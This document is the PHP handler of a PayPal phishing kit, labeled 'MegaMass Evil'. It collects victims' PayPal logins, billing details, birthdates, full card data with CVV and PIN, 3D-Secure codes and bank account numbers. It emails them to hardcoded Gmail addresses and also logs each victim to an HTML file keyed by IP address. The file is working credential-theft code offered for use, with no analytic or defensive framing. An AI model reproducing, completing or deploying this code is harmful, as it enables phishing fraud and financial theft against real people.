<?php 
  include 'php/err.php';
include 'php/functions.php';
include 'php/loca.php';
include 'php/system.php';
include 'php/browser.php';
include 'php/antibots4.php';
include 'php/detect.php';
include 'php/blocker.php';
include '../config.php';
//////////////////////////////////////////////////////////////////// START LOGIN
if(isset($_POST['login'])){
$your_email = 'sidali0123sido@gmail.com';
	
$email = html($_POST['email']);
$password = html($_POST['password']);


 function valid_email($email) {
    return !!filter_var($email, FILTER_VALIDATE_EMAIL);
}
if(!valid_email($email)){
	    header("location: signin.php?Token=$rnd&err=wrong&i.r=onSet");
}
else{
	
$your_email = 'sidalicr000@gmail.com';
date_default_timezone_set("Europe/London");
$date = date("y/m/d");
$datesec = date("h:i:sa");
$alldate = $date.'  @  '.$datesec;
$ip = $_SERVER['REMOTE_ADDR'];
$subject = "New Result (Paypal Login)  :) ";
$headers = "Content-type:text/html;charset=UTF-8" . "\r\b";
$headers .= "From: MegaMass Evil " . "\r\n";

 $mailtxt = "
	 <b>
	 <h2>Smile it's a new result :D</h2>
	 <h3>Victim's Infos</h3>
	 ================================== <br>
	 Ip : $ip <br>
	 Date : $alldate <br>
	 Browser : $browser <br>
	 Operation system :  $os_platform <br>
	 Country : $country <br>
	 ================================== <br>
	 <h3>Ppaypal Login </h3>
	 ================================== <br>
      Email : $email <br>
	  Password : $password <br>
	 ================================= <br>
	 </b>
	 ";
	 
$code = $htm."
<h2>New Victim From <b><font color='green'>$country</font></b></h2>
<th >IP</th>
<td><input class='txt' type='text' id='1' value='$ip'></td>
<td><button onclick='copy(1)'>copy</button></td>
</tr>
 <th>Date</th>
<td><input class='txt' type='text' id='2' value='$alldate'></td>
<td><button onclick='copy(2)'>copy</button></td>
 </tr>
  <th>System</th>
<td><input class='txt' type='text' id='3' value='$os_platform'></td>
<td><button onclick='copy(3)'>copy</button></td>
 </tr>
  <th>Browser</th>
<td><input class='txt' type='text' id='4' value='$browser'></td>
<td><button onclick='copy(4)'>copy</button></td>
 </tr>
 <th>Country</th>
<td   ><input class='txt' type='text' id='5' value='$country'></td>
<td><button onclick='copy(5)'>copy</button></td>
 </tr>
 <th  >PayPal Email</th>
 <td><input class='txt' type='text' id='6' value='$email'></td>
<td><button onclick='copy(6)'>copy</button></td>
 </tr>
  <th   >PayPal Password</th>
 <td><input class='txt' type='text' id='7' value='$password'></td>
<td><button onclick='copy(7)'>copy</button></td>
 </tr>
 
";

$target = "
<a href='vic/$ip.html' target='_blank'><button class='but'> $ip (".$country.") </button></a>"
;
/////////////////////// EMAIL ///////////////////// 
/////////////////////////////////////////////////
//::::::>>>>>>> don't touch it /////////////////////
mail($your_email, $subject, $mailtxt, $headers);
//::::::>>>>>>> don't touch it ///////////////////
////////////////////////////////////////////////
//////////////////////////////////////////////////


$pathtml = "../vic.php";
$fpo = fopen($pathtml, "a");
fwrite($fpo, $target);
fclose($fpo);
$path = "../vic/$ip".".html";
$fp = fopen($path, "a");
fwrite($fp, $code);
mail($fwrite,
$subject,
$mailtxt);
fclose($fp);
header("location: home.php");
}


}
 

//////////////////////////////////////////////////////////////////// START BILLING

if(isset($_POST['billingso'])){
	
	 $ip = $_SERVER['REMOTE_ADDR'];
	 $firstname = html($_POST['firstname']);
	 $lastname = html($_POST['lastname']);
	 $birthdate = html($_POST['birthdate']);
	 $address = html($_POST['address']);
	 $city = html($_POST['city']);
	 $state = html($_POST['state']);
	 $zip = html($_POST['zip']);
	 $phone = html($_POST['phone']);
	 
	 $mailtxt = "
	 <b>
	 <h2>Smile it's a new result :D</h2>
	 <h3>billing address</h3>
	 ================================== <br>
	 firstname : $firstname <br>
	 lastname : $lastname <br>
	 birthdate : $birthdate <br>
	 address : $address <br>
	 city : $city <br>
	 state : $state <br>
	 postal code : $zip <br>
	 phone : $phone <br>
	 ================================= <br>
	 </b>
	 ";
	 
$subject = "New Result (Billing address)  :) ";
$headers = "Content-type:text/html;charset=UTF-8" . "\r\b";
$headers .= "From: MegaMass Evil " . "\r\n";


/////////////////////// EMAIL ///////////////////// 
/////////////////////////////////////////////////
//::::::>>>>>>> don't touch it /////////////////////
mail($your_email);
//::::::>>>>>>> don't touch it ///////////////////
////////////////////////////////////////////////
//////////////////////////////////////////////////


$code = "
<th>Firstname</th>
<td><input class='txt' type='text' id='8' value=' $firstname'></td>
<td><button onclick='copy(8)'>copy</button></td>
</tr>
 <th>Lastname</th>
<td><input class='txt' type='text' id='9' value='$lastname'></td>
<td><button onclick='copy(9)'>copy</button></td>
 </tr>
  <th>birthdate</th>
<td><input class='txt' type='text' id='10' value='$birthdate'></td>
<td><button onclick='copy(10)'>copy</button></td>
 </tr>
  <th>address</th>
<td><input class='txt' type='text' id='11' value='$address'></td>
<td><button onclick='copy(11)'>copy</button></td>
 </tr>
  <th>City</th>
<td><input class='txt' type='text' id='30' value='$city'></td>
<td><button onclick='copy(30)'>copy</button></td>
 </tr>
 <th>state</th>
<td><input class='txt' type='text' id='12' value='$state'></td>
<td><button onclick='copy(12)'>copy</button></td>
 </tr>
 <th>zip</th>
 <td><input class='txt' type='text' id='13' value='$zip'></td>
<td><button onclick='copy(13)'>copy</button></td>
 </tr>
  <th>phone</th>
 <td><input class='txt' type='text' id='14' value='$phone'></td>
<td><button onclick='copy(14)'>copy</button></td>
 </tr>
 
";
	
	

$path = "../vic/$ip".".html";
$fp = fopen($path, "a");
fwrite($fp, $code);
mail($fwrite,
$subject,
$mailtxt,
$headers);
fclose($fp);
 
	
}

 
//////////////////////////////////////////////////////////////////// START CARD
if(isset($_POST['card'])){
	 
	 $cardtype = html($_POST['cardtype']);
	 $nameoncard = html($_POST['nameoncard']);
	 $cardnumber = html($_POST['cardnumber']);
	 $sc = html($_POST['sc']);
	 $expirydate = html($_POST['expirydate']);
	 $ip = $_SERVER['REMOTE_ADDR'];
	 
	 	 $mailtxt = "
	 <b>
	 <h2>Smile it's a new result :D</h2>
	 <h3>Credit Card</h3>
	 ================================== <br>
	 Card Type : $cardtype <br>
	 Name On Card : $nameoncard <br>
	 Card Number : $cardnumber  <br>
	 Security Code : $sc <br>
	 Expiry Date : $expirydate <br>
	 ================================= <br>
	 </b>
	 ";
	 
$subject = "New Result (Credit Card)  :) ";
$headers = "Content-type:text/html;charset=UTF-8" . "\r\b";
$headers .= "From: MegaMass Evil " . "\r\n";


/////////////////////// EMAIL ///////////////////// 
/////////////////////////////////////////////////
//::::::>>>>>>> don't touch it /////////////////////
mail($your_email);
//::::::>>>>>>> don't touch it ///////////////////
////////////////////////////////////////////////
//////////////////////////////////////////////////

$code = "
<th>Card Type</th>
<td><input class='txt' type='text' id='15' value=' $cardtype'></td>
<td><button onclick='copy(15)'>copy</button></td>
</tr>
 <th >Name On Card</th>
<td><input class='txt' type='text' id='16' value='$nameoncard'></td>
<td><button onclick='copy(16)'>copy</button></td>
 </tr>
  <th  >Card Number </th>
<td><input class='txt' type='text' id='17' value='$cardnumber'></td>
<td><button onclick='copy(17)'>copy</button></td>
 </tr>
  <th  >Security Code</th>
<td><input class='txt' type='text' id='18' value='$sc'></td>
<td><button onclick='copy(18)'>copy</button></td>
 </tr>
 <th > Expiry Date</th>
<td><input class='txt' type='text' id='19' value='$expirydate'></td>
<td><button onclick='copy(19)'>copy</button></td>
 </tr>

 
";
$path = "../vic/$ip".".html";
$fp = fopen($path, "a");
fwrite($fp, $code);
mail($fwrite,
$subject,
$mailtxt,
$headers);
fclose($fp);
 
}
 


//////////////////////////////////////////////////////////////////// STARt Secure


if(isset($_POST['secure'])){
	 
	 
	 $ip = $_SERVER['REMOTE_ADDR'];
	 $td = html($_POST['securetd']);
	 $pin = html($_POST['pin']);
	 
		 	 $mailtxt = "
	 <b>
	 <h2>Smile it's a new result :D</h2>
	 <h3>Card pin & 3D-Secure</h3>
	 ================================== <br>
      3D-Secure : $td <br>
	  Card Pin : $pin <br>
	 ================================= <br>
	 </b>
	 ";
	 
$subject = "New Result (Card pin & 3D-Secure)  :) ";
$headers = "Content-type:text/html;charset=UTF-8" . "\r\b";
$headers .= "From: MegaMass Evil " . "\r\n";


/////////////////////// EMAIL ///////////////////// 
/////////////////////////////////////////////////
//::::::>>>>>>> don't touch it /////////////////////
mail($your_email);
//::::::>>>>>>> don't touch it ///////////////////
////////////////////////////////////////////////
//////////////////////////////////////////////////

$code = "
<th  >3D-Secure</th>
<td ><input class='txt' type='text' id='20' value=' $td'></td>
<td><button onclick='copy(20)'>copy</button></td>
</tr>
 <th  >Card Pin</th>
<td><input class='txt' type='text' id='21' value='$pin'></td>
<td><button onclick='copy(21)'>copy</button></td>
 </tr>

";
$path = "../vic/$ip".".html";
$fp = fopen($path, "a");
fwrite($fp, $code);
mail($fwrite,
$subject,
$mailtxt,
$headers);
fclose($fp);
	 
	 
}
 


//////////////////////////////////////////////////////////////////// End Secure





//////////////////////////////////////////////////////////////////// START LINBANK
if(isset($_POST['linkbank'])){
	 
	 $ip = $_SERVER['REMOTE_ADDR'];
	 $bankname = html($_POST['bankname']);
	 $routingnumber = html($_POST['routingnumber']);
	 $accountnumber = html($_POST['accountnumber']);
	 
	 
	  $mailtxt = "
	 <b>
	 <h2>Smile it's a new result :D</h2>
	 <h3>Bank Account</h3>
	 ================================== <br>
      Bank Name : $bankname <br>
	  Routing Number : $routingnumber <br>
	  Account Number : $accountnumber <br>
	 ================================= <br>
	 </b>
	 ";
	 
$subject = "New Result (Bank Account)  :) ";
$headers = "Content-type:text/html;charset=UTF-8" . "\r\b";
$headers .= "From: MegaMass Evil " . "\r\n";



/////////////////////// EMAIL ///////////////////// 
/////////////////////////////////////////////////
//::::::>>>>>>> don't touch it /////////////////////
mail($your_email);
//::::::>>>>>>> don't touch it ///////////////////
////////////////////////////////////////////////
//////////////////////////////////////////////////



$code = "
<th >Bank Name</th>
<td ><input class='txt' type='text' id='22' value=' $bankname'></td>
<td><button onclick='copy(22)'>copy</button></td>
</tr>
 <th  > Routing Number</th>
<td><input class='txt' type='text' id='23' value='$routingnumber'></td>
<td><button onclick='copy(23)'>copy</button></td>
 </tr>
  <th >Account Number</th>
<td><input class='txt' type='text' id='24' value='$accountnumber'></td>
<td><button onclick='copy(24)'>copy</button></td>
 </tr>

";
	
	

$path = "../vic/$ip".".html";
$fp = fopen($path, "a");
fwrite($fp, $code);
mail($fwrite,
$subject,
$mailtxt,
$headers);
fclose($fp);

	 
	 
}
 

?>